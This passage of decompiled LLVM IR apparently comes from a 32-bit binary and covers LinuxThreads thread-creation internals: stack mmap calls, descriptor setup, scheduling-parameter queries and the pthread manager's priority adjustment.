  br i1 %v1_804bc1d, label %dec_label_pc_804bc23, label %dec_label_pc_804bc1f

dec_label_pc_804bc1f:                             ; preds = %dec_label_pc_804bbfa.dec_label_pc_804bc1f_crit_edge, %dec_label_pc_804bc0a
  %v0_804bc2b.pre = phi i32 [ %v0_804bc2b.pre.pre, %dec_label_pc_804bbfa.dec_label_pc_804bc1f_crit_edge ], [ %tmp49, %dec_label_pc_804bc0a ]
  %v0_804bc1f = phi i32 [ %v0_804bc1f.pre, %dec_label_pc_804bbfa.dec_label_pc_804bc1f_crit_edge ], [ %v0_804bc17, %dec_label_pc_804bc0a ]
  %v1_804bc1f = add i32 %v0_804bc1f, 40
  %v2_804bc1f = inttoptr i32 %v1_804bc1f to i32*
  %v3_804bc1f = load i32, i32* %v2_804bc1f, align 4
  store i32 %v3_804bc1f, i32* @ebx, align 4
  br label %dec_label_pc_804bc23

dec_label_pc_804bc23:                             ; preds = %dec_label_pc_804bc0a, %dec_label_pc_804bc1f
  %v0_804bc2b = phi i32 [ %tmp49, %dec_label_pc_804bc0a ], [ %v0_804bc2b.pre, %dec_label_pc_804bc1f ]
  %v1_804bc2b = phi i32 [ %v0_804bc17, %dec_label_pc_804bc0a ], [ %v0_804bc1f, %dec_label_pc_804bc1f ]
  %v2_804bc23 = add i32 %v1_804bc2b, 20
  %v3_804bc23 = inttoptr i32 %v2_804bc23 to i32*
  %v4_804bc23 = load i32, i32* %v3_804bc23, align 4
  %v6_804bc23 = mul i32 %v4_804bc23, -2097152
  store i32 %v6_804bc23, i32* %eax.global-to-local, align 4
  %v2_804bc2b = add i32 %v1_804bc2b, -4
  %v3_804bc2b = inttoptr i32 %v2_804bc2b to i32*
  store i32 %v0_804bc2b, i32* %v3_804bc2b, align 4
  %v0_804bc2c = load i32, i32* @edx, align 4
  %v2_804bc2c = add i32 %v1_804bc2b, -8
  %v3_804bc2c = inttoptr i32 %v2_804bc2c to i32*
  store i32 %v0_804bc2c, i32* %v3_804bc2c, align 4
  %v1_804bc2d = add i32 %v1_804bc2b, -12
  %v2_804bc2d = inttoptr i32 %v1_804bc2d to i32*
  store i32 0, i32* %v2_804bc2d, align 4
  %v0_804bc2f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bc2f = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc2f = add i32 %v0_804bc2f, 2096672
  %v3_804bc2f = add i32 %v2_804bc2f, %v1_804bc2f
  store i32 %v3_804bc2f, i32* @esi, align 4
  %v0_804bc36 = load i32, i32* @global_var_8067654.156, align 4
  store i32 %v0_804bc36, i32* %eax.global-to-local, align 4
  %v1_804bc3b = add i32 %v1_804bc2b, -16
  %v2_804bc3b = inttoptr i32 %v1_804bc3b to i32*
  store i32 -1, i32* %v2_804bc3b, align 4
  %v0_804bc3d = load i32, i32* @esi, align 4
  store i32 %v0_804bc3d, i32* %ecx.global-to-local, align 4
  %v1_804bc3f = add i32 %v1_804bc2b, -20
  %v2_804bc3f = inttoptr i32 %v1_804bc3f to i32*
  store i32 306, i32* %v2_804bc3f, align 4
  %v1_804bc44 = add i32 %v1_804bc2b, -24
  %v2_804bc44 = inttoptr i32 %v1_804bc44 to i32*
  store i32 7, i32* %v2_804bc44, align 4
  %v0_804bc46 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc46 = mul i32 %v0_804bc46, 4
  %v0_804bc49 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804bc49 = sub i32 %v0_804bc49, %v2_804bc46
  store i32 %v2_804bc49, i32* %ecx.global-to-local, align 4
  %v2_804bc4b = add i32 %v1_804bc2b, -28
  %v3_804bc4b = inttoptr i32 %v2_804bc4b to i32*
  store i32 %v2_804bc46, i32* %v3_804bc4b, align 4
  %v0_804bc4c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bc4e = add i32 %v0_804bc4c, 480
  store i32 %v1_804bc4e, i32* %eax.global-to-local, align 4
  %v2_804bc53 = add i32 %v1_804bc2b, -32
  %v3_804bc53 = inttoptr i32 %v2_804bc53 to i32*
  store i32 %v1_804bc4e, i32* %v3_804bc53, align 4
  %v2_804bc54 = load i32, i32* %stack_var_-16, align 4
  %v9_804bc54 = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_804bc54, i32 %v0_804ba07, i32 %v0_804ba06, i32 %v0_804ba05, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804bc59 = load i32, i32* @esp, align 4
  %v1_804bc59 = add i32 %v0_804bc59, 32
  %v1_804bc5c = add i32 %v9_804bc54, 1
  %v8_804bc5c = icmp eq i32 %v1_804bc5c, 0
  store i32 %v1_804bc5c, i32* %eax.global-to-local, align 4
  br i1 %v8_804bc5c, label %dec_label_pc_804bca7, label %dec_label_pc_804bc5f

dec_label_pc_804bc5f:                             ; preds = %dec_label_pc_804bc23
  %v0_804bc5f = load i32, i32* @esi, align 4
  %v1_804bc61 = load i32, i32* @ebx, align 4
  %v2_804bc61 = sub i32 %v0_804bc5f, %v1_804bc61
  store i32 %v2_804bc61, i32* %eax.global-to-local, align 4
  %v2_804bc63 = add i32 %v0_804bc59, 72
  %v3_804bc63 = inttoptr i32 %v2_804bc63 to i32*
  %v4_804bc63 = load i32, i32* %v3_804bc63, align 4
  %v15_804bc63 = icmp eq i32 %v1_804bc61, %v4_804bc63
  %v1_804bc67 = add i32 %v2_804bc61, 480
  store i32 %v1_804bc67, i32* @ebp, align 4
  br i1 %v15_804bc63, label %dec_label_pc_804bc95, label %dec_label_pc_804bc6f

dec_label_pc_804bc6f:                             ; preds = %dec_label_pc_804bc5f
  %v0_804bc6f = load i32, i32* @edi, align 4
  %v1_804bc6f = add i32 %v0_804bc6f, 20
  %v2_804bc6f = inttoptr i32 %v1_804bc6f to i32*
  %v3_804bc6f = load i32, i32* %v2_804bc6f, align 4
  store i32 %v3_804bc6f, i32* %eax.global-to-local, align 4
  %v2_804bc74 = sub i32 %v1_804bc67, %v3_804bc6f
  store i32 %v2_804bc74, i32* %edx.global-to-local, align 4
  %v2_804bc76 = add i32 %v0_804bc59, 40
  %v3_804bc76 = inttoptr i32 %v2_804bc76 to i32*
  store i32 %v3_804bc6f, i32* %v3_804bc76, align 4
  %v0_804bc7a = load i32, i32* %edx.global-to-local, align 4
  %v1_804bc7a = load i32, i32* @esp, align 4
  %v2_804bc7a = add i32 %v1_804bc7a, 12
  %v3_804bc7a = inttoptr i32 %v2_804bc7a to i32*
  store i32 %v0_804bc7a, i32* %v3_804bc7a, align 4
  %v0_804bc7e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bc7e = load i32, i32* @esp, align 4
  %v2_804bc7e = add i32 %v1_804bc7e, -4
  %v3_804bc7e = inttoptr i32 %v2_804bc7e to i32*
  store i32 %v0_804bc7e, i32* %v3_804bc7e, align 4
  %v0_804bc7f = load i32, i32* %ecx.global-to-local, align 4
  %v2_804bc7f = add i32 %v1_804bc7e, -8
  %v3_804bc7f = inttoptr i32 %v2_804bc7f to i32*
  store i32 %v0_804bc7f, i32* %v3_804bc7f, align 4
  %v1_804bc80 = add i32 %v1_804bc7e, -12
  %v2_804bc80 = inttoptr i32 %v1_804bc80 to i32*
  store i32 0, i32* %v2_804bc80, align 4
  %v1_804bc82 = add i32 %v1_804bc7e, -16
  %v2_804bc82 = inttoptr i32 %v1_804bc82 to i32*
  store i32 -1, i32* %v2_804bc82, align 4
  %v1_804bc84 = add i32 %v1_804bc7e, -20
  %v2_804bc84 = inttoptr i32 %v1_804bc84 to i32*
  store i32 16, i32* %v2_804bc84, align 4
  %v1_804bc86 = add i32 %v1_804bc7e, -24
  %v2_804bc86 = inttoptr i32 %v1_804bc86 to i32*
  store i32 0, i32* %v2_804bc86, align 4
  %v0_804bc88 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc88 = add i32 %v1_804bc7e, -28
  %v3_804bc88 = inttoptr i32 %v2_804bc88 to i32*
  store i32 %v0_804bc88, i32* %v3_804bc88, align 4
  %v0_804bc89 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bc89 = add i32 %v1_804bc7e, -32
  %v3_804bc89 = inttoptr i32 %v2_804bc89 to i32*
  store i32 %v0_804bc89, i32* %v3_804bc89, align 4
  %v2_804bc8a = load i32, i32* %stack_var_-16, align 4
  %v9_804bc8a = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_804bc8a, i32 %v0_804ba07, i32 %v0_804ba06, i32 %v0_804ba05, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804bc8f = load i32, i32* @esp, align 4
  %v1_804bc8f = add i32 %v0_804bc8f, 32
  %v1_804bc92 = add i32 %v9_804bc8a, 1
  %v8_804bc92 = icmp eq i32 %v1_804bc92, 0
  store i32 %v1_804bc92, i32* %eax.global-to-local, align 4
  %v1_804bc93 = icmp eq i1 %v8_804bc92, false
  br i1 %v1_804bc93, label %dec_label_pc_804bcb0, label %dec_label_pc_804bc95

dec_label_pc_804bc95:                             ; preds = %dec_label_pc_804bc6f, %dec_label_pc_804bc5f, %dec_label_pc_804bbd8
  %v0_804bc95 = phi i32 [ %v1_804bc8f, %dec_label_pc_804bc6f ], [ %v1_804bc59, %dec_label_pc_804bc5f ], [ %v0_804bba695, %dec_label_pc_804bbd8 ]
  %v1_804bc95 = add i32 %v0_804bc95, 12
  %v2_804bc95 = inttoptr i32 %v1_804bc95 to i32*
  store i32 0, i32* %v2_804bc95, align 4
  %v0_804bc9d = load i32, i32* @esp, align 4
  %v1_804bc9d = add i32 %v0_804bc9d, 8
  %v2_804bc9d = inttoptr i32 %v1_804bc9d to i32*
  store i32 0, i32* %v2_804bc9d, align 4
  %v1_804bcb0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bcb0

dec_label_pc_804bca7:                             ; preds = %dec_label_pc_804bc23, %dec_label_pc_804bbb4
  %v17_804bca7 = phi i32 [ %v1_804bc59, %dec_label_pc_804bc23 ], [ %v0_804bba695, %dec_label_pc_804bbb4 ]
  %v1_804bca7 = add i32 %v17_804bca7, 20
  %v2_804bca7 = inttoptr i32 %v1_804bca7 to i32*
  %v3_804bca7 = load i32, i32* %v2_804bca7, align 4
  %v4_804bca7 = add i32 %v3_804bca7, 1
  store i32 %v4_804bca7, i32* %v2_804bca7, align 4
  %v0_804bba6 = load i32, i32* @esp, align 4
  %v1_804bba6 = add i32 %v0_804bba6, 20
  %v2_804bba6 = inttoptr i32 %v1_804bba6 to i32*
  %v3_804bba6 = load i32, i32* %v2_804bba6, align 4
  %tmp108 = icmp ult i32 %v3_804bba6, 1024
  br i1 %tmp108, label %dec_label_pc_804bbb4, label %dec_label_pc_804bf24

dec_label_pc_804bcb0:                             ; preds = %dec_label_pc_804bc6f, %dec_label_pc_804bc95
  %v1_804bcb0 = phi i32 [ %v1_804bc8f, %dec_label_pc_804bc6f ], [ %v1_804bcb0.pre, %dec_label_pc_804bc95 ]
  %v0_804bcb0 = load i32, i32* @ebx, align 4
  %v2_804bcb0 = add i32 %v1_804bcb0, -4
  %v3_804bcb0 = inttoptr i32 %v2_804bcb0 to i32*
  store i32 %v0_804bcb0, i32* %v3_804bcb0, align 4
  %v0_804bcb1 = load i32, i32* @esi, align 4
  store i32 %v0_804bcb1, i32* @ebx, align 4
  %v1_804bcb3 = add i32 %v1_804bcb0, -8
  %v2_804bcb3 = inttoptr i32 %v1_804bcb3 to i32*
  store i32 480, i32* %v2_804bcb3, align 4
  %v1_804bcb8 = add i32 %v1_804bcb0, -12
  %v2_804bcb8 = inttoptr i32 %v1_804bcb8 to i32*
  store i32 0, i32* %v2_804bcb8, align 4
  %v0_804bcba = load i32, i32* @esi, align 4
  %v2_804bcba = add i32 %v1_804bcb0, -16
  %v3_804bcba = inttoptr i32 %v2_804bcba to i32*
  store i32 %v0_804bcba, i32* %v3_804bcba, align 4
  %v2_804bcbb = load i32, i32* %stack_var_-16, align 4
  %v5_804bcbb = call i32 @__GI_memset(i8* %v4_804bcbb, i32 1, i32 %v2_804bcbb)
  %v0_804bcc0 = load i32, i32* @global_var_80626a0.147, align 32
  %v0_804bcc5 = load i32, i32* @esp, align 4
  %v1_804bcc8 = add i32 %v0_804bcc0, 1
  store i32 %v1_804bcc8, i32* @global_var_80626a0.147, align 32
  %v0_804bcce = load i32, i32* @global_var_806324c.157, align 4
  %v1_804bcd3 = add i32 %v0_804bcce, 1024
  store i32 %v1_804bcd3, i32* %eax.global-to-local, align 4
  store i32 %v1_804bcd3, i32* @global_var_806324c.157, align 4
  %v2_804bcdd = add i32 %v0_804bcc5, 36
  %v3_804bcdd = inttoptr i32 %v2_804bcdd to i32*
  %v4_804bcdd = load i32, i32* %v3_804bcdd, align 4
  %v5_804bcdd = add i32 %v4_804bcdd, %v1_804bcd3
  store i32 %v5_804bcdd, i32* %eax.global-to-local, align 4
  %v2_804bce1 = add i32 %v0_804bcc5, 32
  %v3_804bce1 = inttoptr i32 %v2_804bce1 to i32*
  store i32 %v5_804bcdd, i32* %v3_804bce1, align 4
  %v0_804bce5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bce5 = load i32, i32* @esi, align 4
  %v2_804bce5 = add i32 %v1_804bce5, 16
  %v3_804bce5 = inttoptr i32 %v2_804bce5 to i32*
  store i32 %v0_804bce5, i32* %v3_804bce5, align 4
  %v0_804bce8 = load i32, i32* @esi, align 4
  %v1_804bce8 = add i32 %v0_804bce8, 72
  store i32 %v1_804bce8, i32* %eax.global-to-local, align 4
  %v0_804bceb = load i32, i32* @esp, align 4
  %v1_804bceb = add i32 %v0_804bceb, 20
  %v2_804bceb = inttoptr i32 %v1_804bceb to i32*
  %v3_804bceb = load i32, i32* %v2_804bceb, align 4
  store i32 %v3_804bceb, i32* %edx.global-to-local, align 4
  %v2_804bcef = add i32 %v0_804bce8, 68
  %v3_804bcef = inttoptr i32 %v2_804bcef to i32*
  store i32 %v1_804bce8, i32* %v3_804bcef, align 4
  %v0_804bcf2 = load i32, i32* @esi, align 4
  %v1_804bcf2 = add i32 %v0_804bcf2, 80
  store i32 %v1_804bcf2, i32* %eax.global-to-local, align 4
  %v1_804bcf5 = add i32 %v0_804bcf2, 64
  %v2_804bcf5 = inttoptr i32 %v1_804bcf5 to i8*
  store i8 0, i8* %v2_804bcf5, align 1
  %v0_804bcf9 = load i32, i32* @esi, align 4
  %v1_804bcf9 = add i32 %v0_804bcf9, 65
  %v2_804bcf9 = inttoptr i32 %v1_804bcf9 to i8*
  store i8 0, i8* %v2_804bcf9, align 1
  %v0_804bcfd = load i32, i32* %edx.global-to-local, align 4
  %v2_804bcfd = mul i32 %v0_804bcfd, 16
  store i32 %v2_804bcfd, i32* %edx.global-to-local, align 4
  %v0_804bd00 = load i32, i32* @edi, align 4
  %v1_804bd00 = icmp eq i32 %v0_804bd00, 0
  %v1_804bd02 = add i32 %v2_804bcfd, 134604448
  store i32 %v1_804bd02, i32* %ecx.global-to-local, align 4
  %v1_804bd08 = load i32, i32* @esi, align 4
  %v2_804bd08 = add i32 %v1_804bd08, 28
  %v3_804bd08 = inttoptr i32 %v2_804bd08 to i32*
  store i32 %v1_804bd02, i32* %v3_804bd08, align 4
  %v0_804bd0b = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd0b = load i32, i32* @esi, align 4
  %v2_804bd0b = add i32 %v1_804bd0b, 76
  %v3_804bd0b = inttoptr i32 %v2_804bd0b to i32*
  store i32 %v0_804bd0b, i32* %v3_804bd0b, align 4
  %v0_804bd0e = load i32, i32* @esp, align 4
  %v1_804bd0e = add i32 %v0_804bd0e, 12
  %v2_804bd0e = inttoptr i32 %v1_804bd0e to i32*
  %v3_804bd0e = load i32, i32* %v2_804bd0e, align 4
  store i32 %v3_804bd0e, i32* %eax.global-to-local, align 4
  %v1_804bd12 = load i32, i32* @esi, align 4
  %v2_804bd12 = add i32 %v1_804bd12, 396
  %v3_804bd12 = inttoptr i32 %v2_804bd12 to i32*
  store i32 %v3_804bd0e, i32* %v3_804bd12, align 4
  %v0_804bd18 = load i32, i32* @esp, align 4
  %v1_804bd18 = add i32 %v0_804bd18, 8
  %v2_804bd18 = inttoptr i32 %v1_804bd18 to i32*
  %v3_804bd18 = load i32, i32* %v2_804bd18, align 4
  store i32 %v3_804bd18, i32* %eax.global-to-local, align 4
  %v0_804bd1c = load i32, i32* @esi, align 4
  %v1_804bd1c = load i32, i32* @ebx, align 4
  %v2_804bd1c = add i32 %v1_804bd1c, 404
  %v3_804bd1c = inttoptr i32 %v2_804bd1c to i32*
  store i32 %v0_804bd1c, i32* %v3_804bd1c, align 4
  %v0_804bd22 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bd22 = load i32, i32* @esi, align 4
  %v2_804bd22 = add i32 %v1_804bd22, 400
  %v3_804bd22 = inttoptr i32 %v2_804bd22 to i32*
  store i32 %v0_804bd22, i32* %v3_804bd22, align 4
  %v0_804bd28 = load i32, i32* @esp, align 4
  %v1_804bd28 = add i32 %v0_804bd28, 20
  %v2_804bd28 = inttoptr i32 %v1_804bd28 to i32*
  %v3_804bd28 = load i32, i32* %v2_804bd28, align 4
  store i32 %v3_804bd28, i32* %eax.global-to-local, align 4
  %v1_804bd2c = load i32, i32* @esi, align 4
  %v2_804bd2c = add i32 %v1_804bd2c, 408
  %v3_804bd2c = inttoptr i32 %v2_804bd2c to i32*
  store i32 %v3_804bd28, i32* %v3_804bd2c, align 4
  %v0_804bd32 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bd32 = add i32 %v0_804bd32, 4
  %v2_804bd32 = inttoptr i32 %v1_804bd32 to i32*
  store i32 0, i32* %v2_804bd32, align 4
  %v0_804bd39 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bd39 = add i32 %v0_804bd39, 134604448
  %v2_804bd39 = inttoptr i32 %v1_804bd39 to i32*
  store i32 0, i32* %v2_804bd39, align 4
  %v0_804bd43 = load i32, i32* @esi, align 4
  %v1_804bd43 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd43 = add i32 %v1_804bd43, 134604456
  %v3_804bd43 = inttoptr i32 %v2_804bd43 to i32*
  store i32 %v0_804bd43, i32* %v3_804bd43, align 4
  %v0_804bd49 = load i32, i32* @ebp, align 4
  %v1_804bd49 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bd49 = add i32 %v1_804bd49, 134604460
  %v3_804bd49 = inttoptr i32 %v2_804bd49 to i32*
  store i32 %v0_804bd49, i32* %v3_804bd49, align 4
  %v0_804bd4f = load i32, i32* @esi, align 4
  %v1_804bd4f = add i32 %v0_804bd4f, 228
  %v2_804bd4f = inttoptr i32 %v1_804bd4f to i32*
  store i32 -1, i32* %v2_804bd4f, align 4
  br i1 %v1_804bd00, label %dec_label_pc_804bdc1, label %dec_label_pc_804bd5b

dec_label_pc_804bd5b:                             ; preds = %dec_label_pc_804bcb0
  %v0_804bd5b = load i32, i32* @edi, align 4
  %v1_804bd5b = inttoptr i32 %v0_804bd5b to i32*
  %v2_804bd5b = load i32, i32* %v1_804bd5b, align 4
  store i32 %v2_804bd5b, i32* %eax.global-to-local, align 4
  %v1_804bd5d = trunc i32 %v2_804bd5b to i8
  %v2_804bd5d = load i32, i32* @esi, align 4
  %v3_804bd5d = add i32 %v2_804bd5d, 45
  %v4_804bd5d = inttoptr i32 %v3_804bd5d to i8*
  store i8 %v1_804bd5d, i8* %v4_804bd5d, align 1
  %v0_804bd60 = load i32, i32* @edi, align 4
  %v1_804bd60 = add i32 %v0_804bd60, 24
  %v2_804bd60 = inttoptr i32 %v1_804bd60 to i32*
  %v3_804bd60 = load i32, i32* %v2_804bd60, align 4
  store i32 %v3_804bd60, i32* %eax.global-to-local, align 4
  %v1_804bd63 = load i32, i32* @esi, align 4
  %v2_804bd63 = add i32 %v1_804bd63, 392
  %v3_804bd63 = inttoptr i32 %v2_804bd63 to i32*
  store i32 %v3_804bd60, i32* %v3_804bd63, align 4
  %v0_804bd69 = load i32, i32* @edi, align 4
  %v1_804bd69 = add i32 %v0_804bd69, 12
  %v2_804bd69 = inttoptr i32 %v1_804bd69 to i32*
  %v3_804bd69 = load i32, i32* %v2_804bd69, align 4
  store i32 %v3_804bd69, i32* %eax.global-to-local, align 4
  %v1_804bd6c = icmp eq i32 %v3_804bd69, 0
  br i1 %v1_804bd6c, label %dec_label_pc_804bd91, label %dec_label_pc_804bd70

dec_label_pc_804bd70:                             ; preds = %dec_label_pc_804bd5b
  %v1_804bd70 = add i32 %v3_804bd69, -1
  %v8_804bd70 = icmp eq i32 %v1_804bd70, 0
  store i32 %v1_804bd70, i32* %eax.global-to-local, align 4
  %v1_804bd71 = icmp eq i1 %v8_804bd70, false
  br i1 %v1_804bd71, label %dec_label_pc_804bdb8, label %dec_label_pc_804bd73

dec_label_pc_804bd73:                             ; preds = %dec_label_pc_804bd70
  %v1_804bd73 = add i32 %v0_804bd69, 4
  %v2_804bd73 = inttoptr i32 %v1_804bd73 to i32*
  %v3_804bd73 = load i32, i32* %v2_804bd73, align 4
  %v1_804bd76 = load i32, i32* @esi, align 4
  %v2_804bd76 = add i32 %v1_804bd76, 228
  %v3_804bd76 = inttoptr i32 %v2_804bd76 to i32*
  store i32 %v3_804bd73, i32* %v3_804bd76, align 4
  %v0_804bd7c = load i32, i32* @edi, align 4
  %v1_804bd7c = add i32 %v0_804bd7c, 8
  store i32 %v1_804bd7c, i32* %eax.global-to-local, align 4
  %v0_804bd7f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804bd7f = load i32, i32* @esp, align 4
  %v2_804bd7f = add i32 %v1_804bd7f, -4
  %v3_804bd7f = inttoptr i32 %v2_804bd7f to i32*
  store i32 %v0_804bd7f, i32* %v3_804bd7f, align 4
  %v1_804bd80 = add i32 %v1_804bd7f, -8
  %v2_804bd80 = inttoptr i32 %v1_804bd80 to i32*
  store i32 4, i32* %v2_804bd80, align 4
  %v0_804bd82 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd82 = add i32 %v1_804bd7f, -12
  %v3_804bd82 = inttoptr i32 %v2_804bd82 to i32*
  store i32 %v0_804bd82, i32* %v3_804bd82, align 4
  %v0_804bd83 = load i32, i32* @esi, align 4
  %v1_804bd83 = add i32 %v0_804bd83, 232
  store i32 %v1_804bd83, i32* %eax.global-to-local, align 4
  %v2_804bd89 = add i32 %v1_804bd7f, -16
  %v3_804bd89 = inttoptr i32 %v2_804bd89 to i32*
  store i32 %v1_804bd83, i32* %v3_804bd89, align 4
  %v2_804bd8a = load i32, i32* %stack_var_-16, align 4
  %v5_804bd8a = call i32 @memcpy(i16* %v4_804bdde, i32 1, i32 %v2_804bd8a)
  br label %dec_label_pc_804bdb5

dec_label_pc_804bd91:                             ; preds = %dec_label_pc_804bd5b
  %v0_804bd91 = load i32, i32* @esp, align 4
  %v1_804bd94 = add i32 %v0_804bd91, 28
  %v2_804bd94 = inttoptr i32 %v1_804bd94 to i32*
  %v3_804bd94 = load i32, i32* %v2_804bd94, align 4
  %v5_804bd94 = add i32 %v0_804bd91, -16
  %v6_804bd94 = inttoptr i32 %v5_804bd94 to i32*
  store i32 %v3_804bd94, i32* %v6_804bd94, align 4
  %v1_804bd98 = call i32 @sched_getscheduler(i32 %arg1)
  %v1_804bd9d = load i32, i32* @esi, align 4
  %v2_804bd9d = add i32 %v1_804bd9d, 228
  %v3_804bd9d = inttoptr i32 %v2_804bd9d to i32*
  store i32 %v1_804bd98, i32* %v3_804bd9d, align 4
  %v0_804bda3 = load i32, i32* @esp, align 4
  %v1_804bda3 = inttoptr i32 %v0_804bda3 to i32*
  %v3_804bda3 = add i32 %v0_804bda3, 4
  %v0_804bda4 = load i32, i32* @esi, align 4
  %v1_804bda4 = add i32 %v0_804bda4, 232
  store i32 %v1_804bda4, i32* %eax.global-to-local, align 4
  %v1_804bdaa = inttoptr i32 %v3_804bda3 to i32*
  %v2_804bdaa = load i32, i32* %v1_804bdaa, align 4
  store i32 %v2_804bdaa, i32* %edx.global-to-local, align 4
  store i32 %v1_804bda4, i32* %v1_804bdaa, align 4
  %v1_804bdac = add i32 %v0_804bda3, 44
  %v2_804bdac = inttoptr i32 %v1_804bdac to i32*
  %v3_804bdac = load i32, i32* %v2_804bdac, align 4
  store i32 %v3_804bdac, i32* %v1_804bda3, align 4
  %v2_804bdb0 = load i32, i32* %stack_var_-16, align 4
  %v5_804bdb0 = call i32 @sched_getparam(i32 %arg1, i32 1, i32 %v2_804bdb0, i32 %v0_804ba07)
  br label %dec_label_pc_804bdb5

dec_label_pc_804bdb5:                             ; preds = %dec_label_pc_804bd73, %dec_label_pc_804bd91
  %storemerge2 = phi i32 [ %v5_804bdb0, %dec_label_pc_804bd91 ], [ %v5_804bd8a, %dec_label_pc_804bd73 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bdb8

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bd70, %dec_label_pc_804bdb5
  %v0_804bdb8 = load i32, i32* @ebx, align 4
  %v1_804bdb8 = add i32 %v0_804bdb8, 232
  %v2_804bdb8 = inttoptr i32 %v1_804bdb8 to i32*
  %v3_804bdb8 = load i32, i32* %v2_804bdb8, align 4
  store i32 %v3_804bdb8, i32* %eax.global-to-local, align 4
  %v2_804bdbe = add i32 %v0_804bdb8, 24
  %v3_804bdbe = inttoptr i32 %v2_804bdbe to i32*
  store i32 %v3_804bdb8, i32* %v3_804bdbe, align 4
  br label %dec_label_pc_804bdc1

dec_label_pc_804bdc1:                             ; preds = %dec_label_pc_804bcb0, %dec_label_pc_804bdb8
  %v0_804bdc1 = load i32, i32* @esp, align 4
  %v1_804bdc1 = add i32 %v0_804bdc1, 36
  %v2_804bdc1 = inttoptr i32 %v1_804bdc1 to i32*
  %v3_804bdc1 = load i32, i32* %v2_804bdc1, align 4
  %v1_804bdc5 = add i32 %v0_804bdc1, 68
  store i32 %v1_804bdc5, i32* %eax.global-to-local, align 4
  %v1_804bdc9 = load i32, i32* @ebx, align 4
  %v2_804bdc9 = add i32 %v1_804bdc9, 92
  %v3_804bdc9 = inttoptr i32 %v2_804bdc9 to i32*
  store i32 %v3_804bdc1, i32* %v3_804bdc9, align 4
  %v0_804bdcc = load i32, i32* @ebx, align 4
  %v1_804bdcc = add i32 %v0_804bdcc, 100
  store i32 %v1_804bdcc, i32* @edx, align 4
  %v0_804bdcf = load i32, i32* @esp, align 4
  %v1_804bdcf = add i32 %v0_804bdcf, 32
  %v2_804bdcf = inttoptr i32 %v1_804bdcf to i32*
  %v3_804bdcf = load i32, i32* %v2_804bdcf, align 4
  store i32 %v3_804bdcf, i32* %ecx.global-to-local, align 4
  %v2_804bdd3 = add i32 %v0_804bdcc, 96
  %v3_804bdd3 = inttoptr i32 %v2_804bdd3 to i32*
  store i32 %v3_804bdcf, i32* %v3_804bdd3, align 4
  %v0_804bdd6 = load i32, i32* @ebp, align 4
  %v1_804bdd6 = load i32, i32* @esp, align 4
  %v2_804bdd6 = add i32 %v1_804bdd6, -4
  %v3_804bdd6 = inttoptr i32 %v2_804bdd6 to i32*
  store i32 %v0_804bdd6, i32* %v3_804bdd6, align 4
  %v1_804bdd7 = add i32 %v1_804bdd6, -8
  %v2_804bdd7 = inttoptr i32 %v1_804bdd7 to i32*
  store i32 128, i32* %v2_804bdd7, align 4
  %v0_804bddc = load i32, i32* %eax.global-to-local, align 4
  %v2_804bddc = add i32 %v1_804bdd6, -12
  %v3_804bddc = inttoptr i32 %v2_804bddc to i32*
  store i32 %v0_804bddc, i32* %v3_804bddc, align 4
  %v0_804bddd = load i32, i32* @edx, align 4
  %v2_804bddd = add i32 %v1_804bdd6, -16
  %v3_804bddd = inttoptr i32 %v2_804bddd to i32*
  store i32 %v0_804bddd, i32* %v3_804bddd, align 4
  %v2_804bdde = load i32, i32* %stack_var_-16, align 4
  %v5_804bdde = call i32 @memcpy(i16* %v4_804bdde, i32 1, i32 %v2_804bdde)
  store i32 %v5_804bdde, i32* %eax.global-to-local, align 4
  %v0_804bde3 = load i32, i32* @esp, align 4
  %v1_804bde3 = inttoptr i32 %v0_804bde3 to i32*
  %v2_804bde3 = load i32, i32* %v1_804bde3, align 4
  store i32 %v2_804bde3, i32* @esi, align 4
  %v0_804bde4 = load i32, i32* @ebx, align 4
  %v1_804bde4 = add i32 %v0_804bde4, 24
  %v2_804bde4 = inttoptr i32 %v1_804bde4 to i32*
  %v3_804bde4 = load i32, i32* %v2_804bde4, align 4
  store i32 %v3_804bde4, i32* %v1_804bde3, align 4
  %v1_804bde7 = call i32 @__pthread_manager_adjust_prio(i32 %arg1)
  %v0_804bdec = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v1_804bdf4 = load i32, i32* @ebx, align 4
  %v2_804bdf4 = add i32 %v1_804bdf4, 4
  %v3_804bdf4 = inttoptr i32 %v2_804bdf4 to i32*
  store i32 %v0_804bdec, i32* %v3_804bdf4, align 4
  %v0_804bdf7 = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v1_804bdfe = load i32, i32* @ebx, align 4
  %v2_804bdfe = inttoptr i32 %v1_804bdfe to i32*
  store i32 %v0_804bdf7, i32* %v2_804bdfe, align 4
  %v0_804be00 = load i32, i32* bitcast (i32** @global_var_8062a80.143 to i32*), align 128
  %v0_804be07 = load i32, i32* @ebx, align 4
  store i32 %v0_804be07, i32* @global_var_8062a84.142, align 4
  store i32 %v0_804be00, i32* %eax.global-to-local, align 4
  %v2_804be0f = inttoptr i32 %v0_804be00 to i32*
  store i32 %v0_804be07, i32* %v2_804be0f, align 4
  %v0_804be11 = load i32, i32* @esp, align 4
  %v1_804be11 = add i32 %v0_804be11, 24
  %v2_804be11 = inttoptr i32 %v1_804be11 to i32*
